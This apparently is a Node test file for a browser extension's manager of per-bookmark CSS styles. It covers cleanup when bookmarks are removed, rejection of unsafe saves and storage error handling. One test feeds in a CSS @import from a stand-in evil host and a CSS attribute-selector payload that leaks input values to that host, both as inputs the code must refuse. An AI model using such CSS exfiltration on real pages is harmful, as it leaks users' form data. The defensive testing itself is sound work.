import assert from 'node:assert/strict';
import test from 'node:test';

import { PageStyleManager } from '../src/managers/impl/pageStyleManager.ts';
import { BOOKMARK_PAGE_STYLES_KEY } from '../src/managers/shared/pageStyleApi.ts';

const entry = (css, autoApply, origin, rev) => ({ css, autoApply, origin, rev });

// A manager over a fake storage area; `local` is the area, `writes` counts storage.set calls
function createManager({ stored = {}, getError = null } = {})
{
  const local = { ...stored };
  const counters = { writes: 0 };
  let revs = 0;
  const manager = new PageStyleManager({
    storage: {
      get: async (key) =>
      {
        if (getError) throw getError;
        return key in local ? { [key]: local[key] } : {};
      },
      set: async (values) =>
      {
        counters.writes++;
        Object.assign(local, values);
      },
    },
    broadcast: async () => {},
    newRev: () => `rev-${++revs}`,
  });
  return { manager, local, counters };
}

test('removing a bookmark, and later the folder holding another, drops their styles and keeps the rest', async () =>
{
  // Bookmark 10 sits in folder 5, bookmark 11 in its subfolder 6; bookmark 12 is elsewhere
  const { manager, local, counters } = createManager({
    stored: {
      [BOOKMARK_PAGE_STYLES_KEY]: {
        10: entry('a {}', true, 'https://a.test', 'r1'),
        11: entry('b {}', false, 'https://b.test', 'r2'),
        12: entry('c {}', true, 'https://c.test', 'r3'),
      },
    },
  });
  await manager.load();

  await manager.handleBookmarksRemoved(['10']);

  assert.equal(manager.styles.styleFor('10'), null);
  assert.deepEqual(local[BOOKMARK_PAGE_STYLES_KEY], {
    11: entry('b {}', false, 'https://b.test', 'r2'),
    12: entry('c {}', true, 'https://c.test', 'r3'),
  });

  // bookmarks.onRemoved for folder 5: its id and every descendant's
  await manager.handleBookmarksRemoved(['5', '6', '11']);

  assert.deepEqual(local[BOOKMARK_PAGE_STYLES_KEY], { 12: entry('c {}', true, 'https://c.test', 'r3') });
  assert.deepEqual(manager.getState().styles, { 12: entry('c {}', true, 'https://c.test', 'r3') });

  const writesBefore = counters.writes;
  await manager.handleBookmarksRemoved(['40', '41']);

  assert.equal(counters.writes, writesBefore);
});

test('save refuses CSS that loads remote content and pages that are not http(s), and keeps the stored value', async () =>
{
  const stored = { 10: entry('video { width: 100% !important; }', true, 'https://videos.test', 'r1') };
  const { manager, local, counters } = createManager({ stored: { [BOOKMARK_PAGE_STYLES_KEY]: stored } });
  await manager.load();

  await assert.rejects(
    manager.save('10', '@import "https://evil.test/x.css";\nvideo { width: 90% !important; }', 'https://videos.test/u/1'),
    /@import is not allowed/
  );
  await assert.rejects(
    manager.save('10', 'input[value^="a"] { background: url(https://evil.test/leak?a) }', 'https://videos.test/u/1'),
    /url\(\) with a non-data: URL is not allowed/
  );
  await assert.rejects(
    manager.save('11', 'body { color: red; }', 'chrome://settings'),
    /only http and https pages/
  );

  assert.equal(counters.writes, 0);
  assert.deepEqual(local[BOOKMARK_PAGE_STYLES_KEY], stored);
  assert.deepEqual(manager.getState().styles, stored);
});

test('an unreadable stored value is not overwritten by a bookmark-removed event, and load still resolves', async (t) =>
{
  t.mock.method(console, 'error', () => {});
  const unreadable = [entry('a {}', true, 'https://a.test', 'r1')];
  const { manager, local, counters } = createManager({ stored: { [BOOKMARK_PAGE_STYLES_KEY]: unreadable } });

  await manager.load();
  await manager.handleBookmarksRemoved(['0', '10']);

  assert.equal(counters.writes, 0);
  assert.deepEqual(local[BOOKMARK_PAGE_STYLES_KEY], unreadable);

  // A storage error doesn't reject the load either: stateReady waits on it
  const failing = createManager({ getError: new Error('storage unavailable') });
  await failing.manager.load();

  assert.deepEqual(failing.manager.getState().styles, {});
});
